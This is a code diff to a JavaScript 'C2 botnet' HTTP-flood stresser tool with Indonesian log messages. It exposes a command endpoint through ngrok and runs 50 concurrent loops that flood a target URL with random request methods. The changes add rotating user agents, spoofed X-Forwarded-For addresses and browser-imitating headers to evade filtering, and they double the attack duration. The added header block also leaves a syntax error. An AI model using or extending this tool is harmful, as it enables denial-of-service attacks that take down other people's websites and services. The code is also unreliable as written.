@@ -24,7 +24,7 @@ const L = () => {
 ⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
 ⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   `.cyan);
-  console.log(`C2 BOTNET VERSION\n`.yellow);
+  console.log(`C2 BOTNET DIZ FLYZE STRESER\n`.yellow);
 };
 
 const N = async () => {
@@ -36,8 +36,8 @@ const N = async () => {
       region: 'ap'
     });
     
-    console.log(`\n${'[ API C2 ] :'.bold} ${url.underline}`);
-    console.log(`${'[ INFO ] : [ MENUNGGU ]'.yellow}\n`);
+    console.log(`${'🍁'.cyan} ${'╔═(api)Dizflyze Streser)\n╚═══➤ '.white} ${url.underline}`);
+    console.log(`${'🐥'.yellow} ${'[ MENUNGGU ]'.yellow}\n`);
     return url;
   } catch (e) {
     console.log(`\n${'×'.red} ${'[ NGROK ERROR ] :'.bold} ${e.message}`);
@@ -48,29 +48,44 @@ const N = async () => {
 const A = async (target, duration) => {
   const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
   const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)'
   ];
 
-  console.log(`\n${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
-  console.log(`${'⏳'.cyan} ${'[ DURASI ]:'.bold} ${duration.toString().yellow} detik\n`);
+  console.log(`${'⚡'.yellow} ${'[ ATTACK ] :'.bold} ${target.underline}`);
+  console.log(`${'⏳'.cyan} ${'[ DURASI ] :'.bold} ${duration.toString().yellow} detik\n`);
 
   const AP = [];
   const startTime = Date.now();
   
   for (let i = 0; i < 50; i++) {
     AP.push(new Promise(async (resolve) => {
-      while (Date.now() - startTime < duration * 1000) {
+      while (Date.now() - startTime < duration * 2000) {
         try {
           await axios({
             method: methods[Math.floor(Math.random() * methods.length)],
             url: target,
             headers: {
-              'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-              'X-Forwarded-For': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`,
-              'Accept-Language': 'en-US,en;q=0.9',
-              'Cache-Control': 'no-cache'
-            },
-            timeout: 2500
+                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                'X-Forwarded-For': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`,
+                'Cache-Control': 'no-cache, max-age=0',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1',
+                'Upgrade-Insecure-Requests': '1',
+                'Referer': 'https://google.com/',
+                'DNT': '1',
+                'Pragma': 'no-cache',
+                'TE': 'trailers'
+              }
+            timeout: 2000
           });
         } catch (e) {}
       }
